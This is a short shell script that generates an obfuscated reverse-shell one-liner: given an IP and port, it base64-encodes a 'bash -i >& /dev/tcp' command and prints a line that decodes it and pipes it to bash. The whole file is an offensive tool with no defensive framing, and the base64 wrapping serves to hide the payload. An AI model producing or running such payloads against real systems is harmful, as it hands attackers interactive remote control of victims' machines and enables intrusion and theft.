#!/bin/sh

if [ $# -ne 2 ]
then
	echo 'Usage rev_sh_gen IP PORT'
	exit 1
fi

ENC=`echo "bash -i >& /dev/tcp/$1/$2 0>&1" | base64`

echo "echo \"$ENC\" | base64 -d | bash"
